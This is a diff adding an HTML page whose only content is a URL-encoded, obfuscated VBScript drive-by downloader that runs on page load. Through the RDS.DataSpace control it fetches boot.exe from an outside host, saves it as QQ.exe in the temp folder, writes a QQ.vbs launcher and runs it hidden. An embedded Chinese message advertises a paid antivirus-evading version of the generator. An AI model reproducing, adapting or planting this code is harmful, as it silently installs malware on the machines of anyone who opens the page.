@@ -1,0 +1,20 @@
+<HTML>
+<HEAD>
+<SCRIPT LANGUAGE="Javascript">
+<!--
+//g
+
+var Words ="%3CSCRIPT%20language%3DVBScript%3E%20%0D%0Aon%20error%20resume%20next%20%0D%0Ahuohu%20%3D%22http%3A//user.free.77169.net//cao360/boot.exe%22%0D%0Afname1%3D%22QQ.exe%22%0D%0Afname2%3D%22QQ.vbs%22%0D%0ASet%20df%20%3D%20document.createElement%28%22o%22%26%22b%22%26%22j%22%26%22e%22%26%22c%22%26%22t%22%29%20%0D%0Adf.setAttribute%20%22c%22%26%22l%22%26%22a%22%26%22s%22%26%22s%22%26%22i%22%26%22d%22%2C%20%22c%22%26%22l%22%26%22s%22%26%22id%3A%22%26%22B%22%26%22D%22%26%2296%22%26%22C5%22%26%2256%22%26%22-65%22%26%22A3%22%26%22-11%22%26%22D0%22%26%22-98%22%26%223A%22%26%22-00%22%26%22C04%22%26%22FC2%22%26%229E%22%26%2236%22%20%0D%0Astr%3D%22Mic%22%26%22ro%22%26%22so%22%26%22ft.%22%26%22X%22%26%22M%22%26%22L%22%26%22HT%22%26%22TP%22%0D%0ASet%20x%20%3D%20df.CreateObject%28str%2C%22%22%29%20%0D%0Aa1%3D%22A%22%26%22d%22%26%22o%22%20%0D%0Aa2%3D%22d%22%26%22b.%22%20%0D%0Aa3%3D%22S%22%26%22tr%22%20%0D%0Aa4%3D%22e%22%26%22am%22%20%20%0D%0Astr5%3D%22A%22%26%22d%22%26%22o%22%26%22d%22%26%22b.%22%26%22S%22%26%22tr%22%26%22e%22%26%22am%22%20%0D%0Aset%20S%20%3D%20df.createobject%28str5%2C%22%22%29%20%0D%0AS.type%20%3D%201%0D%0Astr6%3D%22G%22%26%22E%22%26%22T%22%0D%0Ax.Open%20str6%2C%20huohu%2C%20False%20%0D%0Ax.Send%20%0D%0Aset%20F%20%3D%20df.createobject%28%22Scripting.FileSystemObject%22%2C%22%22%29%20%0D%0Aset%20tmp%20%3D%20F.GetSpecialFolder%282%29%20%20%0D%0Afname1%3D%20F.BuildPath%28tmp%2Cfname1%29%0D%0AS.open%0D%0AS.write%20x.responseBody%20%0D%0AS.savetofile%20fname1%2C2%20%0D%0AS.close%0D%0Afname2%3D%20F.BuildPath%28tmp%2Cfname2%29%0D%0Aset%20ts%20%3D%20F.OpenTextFile%28fname2%2C%202%2C%20True%29%0D%0Ats.WriteLine%20%22Set%20Shell%20%3D%20CreateObject%28%22%22Sh%22%22%26%22%22ell%22%22%26%22%22.App%22%22%26%22%22lic%22%22%26%22%22at%22%22%26%22%22ion%22%22%29%22%0D%0Asql%3D%22Shell.ShellExecute%22%22%22+fname1+%22%22%22%2C%22%22%22%22%2C%22%22%22%22%2C%22%22o%22%22%26%22%22p%22%22%26%22%22e%22%22%26%22%22n%22%22%2C0%22%0D%0Ats.writeLine%20sql%0D%0Ats.close%0D%0Aif%20F.FileExists%28fname1%29%3Dtrue%20then%0D%0Aif%20F.FileExists%28fname2%29%3Dtrue%20then%0D%0Ad3%3D%22She%22%26%22ll.%22%26%22App%22%26%22li%22%26%22ca%22%26%22tion%22%0D%0Aset%20Q%20%3D%20df.createobject%28d3%2C%22%22%29%0D%0Adc%3D%22o%22%26%22p%22%26%22e%22%26%22n%22%0D%0AQ.ShellExecute%20fname2%2C%22%22%2C%22%22%2Cdc%2C0%0D%0Aend%20if%0D%0AEnd%20if%20%0D%0A%3C/SCRIPT%3E%0D%0A%3Cscript%20type%3D%22text/jscript%22%3Efunction%20init%28%29%20%7B%20document.write%28%22%u706B%u72D0%u5185%u90E8%u751F%u6210%u5668%uFF0C%u5546%u4E1A%u7528%u9014%u8BF7%u8D2D%u4E70%u5546%u4E1AVIP%u7248%3A%u514D%u6740%uFF0C%u8FC7%u5168%u90E8%u7CFB%u7EDF%uFF0C%u4E0D%u5361%uFF0C%u4E0D%u95EA%uFF0C%u975E%u5783%u573E%u9A6C%uFF0C%u6709%u8BDA%u610F%u8BF7%u8054%u7CFB%u6211%u4EEC%uFF0CQQ%uFF1A5798592%22%29%3B%7Dwindow.onload%20%3D%20init%3B%3C/script%3E%0D%0A%0D%0A" 
+function OutWord()
+{
+var NewWords;
+NewWords = unescape(Words);
+document.write(NewWords);
+}
+OutWord();
+// -->
+</SCRIPT>
+</HEAD>
+<BODY>
+</BODY>
+</HTML>
